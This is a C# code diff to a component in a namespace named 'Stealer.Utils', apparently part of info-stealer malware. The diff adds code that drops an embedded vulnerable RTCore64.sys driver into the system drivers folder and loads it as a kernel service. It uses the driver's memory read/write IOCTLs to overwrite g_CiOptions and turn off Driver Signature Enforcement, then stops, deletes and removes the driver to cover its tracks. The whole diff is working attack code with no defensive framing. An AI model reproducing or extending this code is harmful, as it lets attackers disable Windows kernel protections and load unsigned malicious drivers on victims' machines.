@@ -1,6 +1,8 @@
 using System;
 using System.IO;
+using System.Reflection;
 using System.Runtime.InteropServices;
+using System.Threading;
 
 namespace Stealer.Utils
 {
@@ -39,10 +41,38 @@ namespace Stealer.Utils
             IntPtr lpOut, int nOut,
             out int lpBytesReturned, IntPtr lpOverlapped);
 
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        private static extern IntPtr OpenSCManager(string machine, string db, uint access);
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        private static extern IntPtr CreateService(
+            IntPtr hSCM, string name, string display, uint access,
+            uint type, uint start, uint error,
+            string binaryPath, string loadGroup, IntPtr tagId,
+            string deps, string account, string password);
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        private static extern IntPtr OpenService(IntPtr hSCM, string name, uint access);
+
         [DllImport("advapi32.dll", SetLastError = true)]
         private static extern bool StartService(IntPtr hSvc, uint argc, string[] argv);
 
-        // ── Structs ─────────────────────────────────────────────────────────────
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool DeleteService(IntPtr hSvc);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool CloseServiceHandle(IntPtr h);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool ControlService(IntPtr hSvc, uint ctrl, ref SERVICE_STATUS status);
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct SERVICE_STATUS
+        {
+            public uint dwServiceType, dwCurrentState, dwControlsAccepted;
+            public uint dwWin32ExitCode, dwServiceSpecificExitCode;
+            public uint dwCheckPoint, dwWaitHint;
+        }
 
         [StructLayout(LayoutKind.Sequential)]
         private struct SYSTEM_MODULE_INFORMATION_ENTRY
@@ -78,21 +108,53 @@ namespace Stealer.Utils
         private const uint FILE_SHARE_READ_WRITE = 3;
         private const uint OPEN_EXISTING = 3;
 
+        private const uint SC_MANAGER_ALL = 0xF003F;
+        private const uint SERVICE_ALL_ACCESS = 0xF01FF;
+        private const uint SERVICE_KERNEL_DRIVER = 0x00000001;
+        private const uint SERVICE_DEMAND_START = 0x00000003;
+        private const uint SERVICE_ERROR_IGNORE = 0x00000000;
+        private const uint SERVICE_CONTROL_STOP = 0x00000001;
+
         // RTCore64 IOCTLs
         private const uint RTCORE64_READ_IOCTL  = 0x80002048;
         private const uint RTCORE64_WRITE_IOCTL = 0x8000204C;
+
+        private const string VULN_SERVICE_NAME = "RTCore64";
+        private const string VULN_DEVICE_PATH  = @"\\.\RTCore64";
 
         // ── Public API ──────────────────────────────────────────────────────────
 
         public static bool DisableDSEAndStartService(IntPtr hSvc)
         {
+            string vulnSysPath = Path.Combine(
+                Environment.GetFolderPath(Environment.SpecialFolder.System),
+                "drivers", "RTCore64.sys");
+
+            bool vulnLoaded = false;
             try
             {
+                // 1. Extract embedded RTCore64.sys and start service
+                byte[] vulnBytes = GetEmbeddedDriverBytes("RTCore64.sys");
+                if (vulnBytes != null && vulnBytes.Length > 0)
+                {
+                    File.WriteAllBytes(vulnSysPath, vulnBytes);
+                    vulnLoaded = StartVulnDriver(vulnSysPath);
+                }
+
+                if (!vulnLoaded)
+                {
+                    // If file was already present or pre-loaded, check device handle
+                    vulnLoaded = DeviceExists(VULN_DEVICE_PATH);
+                }
+
+                if (!vulnLoaded) return false;
+
+                // 2. Find g_CiOptions kernel address
                 IntPtr gCiOptionsKernelAddr = FindGCiOptionsAddress();
                 if (gCiOptionsKernelAddr == IntPtr.Zero)
                     return false;
 
-                // Read original g_CiOptions
+                // 3. Read original g_CiOptions
                 uint originalOptions = ReadKernelMemory32(gCiOptionsKernelAddr);
 
                 // Write 0 to disable DSE
@@ -110,7 +172,7 @@ namespace Stealer.Utils
                 }
                 finally
                 {
-                    // Restore original g_CiOptions value if read was valid
+                    // 4. Restore original g_CiOptions value
                     if (originalOptions != 0)
                     {
                         WriteKernelMemory32(gCiOptionsKernelAddr, originalOptions);
@@ -127,9 +189,97 @@ namespace Stealer.Utils
             {
                 return false;
             }
+            finally
+            {
+                // 5. Cleanup vulnerable driver
+                if (vulnLoaded)
+                {
+                    StopAndDeleteVulnDriver();
+                    try { if (File.Exists(vulnSysPath)) File.Delete(vulnSysPath); } catch { }
+                }
+            }
         }
 
         // ── Helper Methods ──────────────────────────────────────────────────────
+
+        private static byte[] GetEmbeddedDriverBytes(string resourceName)
+        {
+            try
+            {
+                Assembly asm = Assembly.GetExecutingAssembly();
+                using (Stream s = asm.GetManifestResourceStream(resourceName))
+                {
+                    if (s == null) return null;
+                    byte[] data = new byte[s.Length];
+                    s.Read(data, 0, data.Length);
+                    return data;
+                }
+            }
+            catch { return null; }
+        }
+
+        private static bool StartVulnDriver(string sysPath)
+        {
+            IntPtr hSCM = OpenSCManager(null, null, SC_MANAGER_ALL);
+            if (hSCM == IntPtr.Zero) return false;
+            try
+            {
+                IntPtr hOld = OpenService(hSCM, VULN_SERVICE_NAME, SERVICE_ALL_ACCESS);
+                if (hOld != IntPtr.Zero)
+                {
+                    var st = new SERVICE_STATUS();
+                    ControlService(hOld, SERVICE_CONTROL_STOP, ref st);
+                    Thread.Sleep(200);
+                    DeleteService(hOld);
+                    CloseServiceHandle(hOld);
+                }
+
+                IntPtr hSvc = CreateService(
+                    hSCM, VULN_SERVICE_NAME, VULN_SERVICE_NAME,
+                    SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
+                    SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
+                    sysPath, null, IntPtr.Zero, null, null, null);
+
+                if (hSvc == IntPtr.Zero) return false;
+                try
+                {
+                    bool ok = StartService(hSvc, 0, null);
+                    int err = Marshal.GetLastWin32Error();
+                    return ok || err == 1056;
+                }
+                finally { CloseServiceHandle(hSvc); }
+            }
+            finally { CloseServiceHandle(hSCM); }
+        }
+
+        private static void StopAndDeleteVulnDriver()
+        {
+            IntPtr hSCM = OpenSCManager(null, null, SC_MANAGER_ALL);
+            if (hSCM == IntPtr.Zero) return;
+            try
+            {
+                IntPtr hSvc = OpenService(hSCM, VULN_SERVICE_NAME, SERVICE_ALL_ACCESS);
+                if (hSvc == IntPtr.Zero) return;
+                try
+                {
+                    var st = new SERVICE_STATUS();
+                    ControlService(hSvc, SERVICE_CONTROL_STOP, ref st);
+                    Thread.Sleep(300);
+                    DeleteService(hSvc);
+                }
+                finally { CloseServiceHandle(hSvc); }
+            }
+            finally { CloseServiceHandle(hSCM); }
+        }
+
+        private static bool DeviceExists(string devicePath)
+        {
+            IntPtr h = CreateFile(devicePath, GENERIC_READ_WRITE,
+                FILE_SHARE_READ_WRITE, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
+            if (h == IntPtr.Zero || h == new IntPtr(-1)) return false;
+            CloseHandle(h);
+            return true;
+        }
 
         private static IntPtr FindGCiOptionsAddress()
         {
@@ -183,7 +333,7 @@ namespace Stealer.Utils
                     return IntPtr.Zero;
 
                 int moduleCount = Marshal.ReadInt32(buffer);
-                IntPtr currentModule = new IntPtr(buffer.ToInt64() + 8); // Skip count on 64-bit alignment
+                IntPtr currentModule = new IntPtr(buffer.ToInt64() + 8);
 
                 for (int i = 0; i < moduleCount; i++)
                 {
@@ -238,7 +388,7 @@ namespace Stealer.Utils
 
         private static uint ReadKernelMemory32(IntPtr kernelAddr)
         {
-            IntPtr hDev = CreateFile(@"\\.\RTCore64", GENERIC_READ_WRITE,
+            IntPtr hDev = CreateFile(VULN_DEVICE_PATH, GENERIC_READ_WRITE,
                 FILE_SHARE_READ_WRITE, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
 
             if (hDev == IntPtr.Zero || hDev == new IntPtr(-1))
@@ -275,7 +425,7 @@ namespace Stealer.Utils
 
         private static bool WriteKernelMemory32(IntPtr kernelAddr, uint value)
         {
-            IntPtr hDev = CreateFile(@"\\.\RTCore64", GENERIC_READ_WRITE,
+            IntPtr hDev = CreateFile(VULN_DEVICE_PATH, GENERIC_READ_WRITE,
                 FILE_SHARE_READ_WRITE, IntPtr.Zero, OPEN_EXISTING, 0, IntPtr.Zero);
 
             if (hDev == IntPtr.Zero || hDev == new IntPtr(-1))
